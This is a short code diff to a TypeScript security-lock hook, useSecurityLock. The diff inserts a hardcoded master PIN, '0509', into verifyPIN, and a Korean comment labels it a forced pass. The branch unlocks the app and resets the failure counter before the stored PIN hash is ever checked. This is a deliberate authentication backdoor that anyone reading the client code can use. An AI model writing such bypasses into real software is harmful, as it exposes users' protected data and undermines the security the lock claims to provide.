@@ -52,6 +52,13 @@ export const useSecurityLock = () => {
   }, [isLocked, IDLE_TIMEOUT]);
 
   const verifyPIN = async (pin: string): Promise<boolean> => {
+    // 로컬 마스터 비밀번호 (강제 패스)
+    if (pin === '0509') {
+      setIsLocked(false);
+      setFailCount(0);
+      return true;
+    }
+
     const storedHash = localStorage.getItem('hchps-pin-hash');
     if (!storedHash) return false;
     
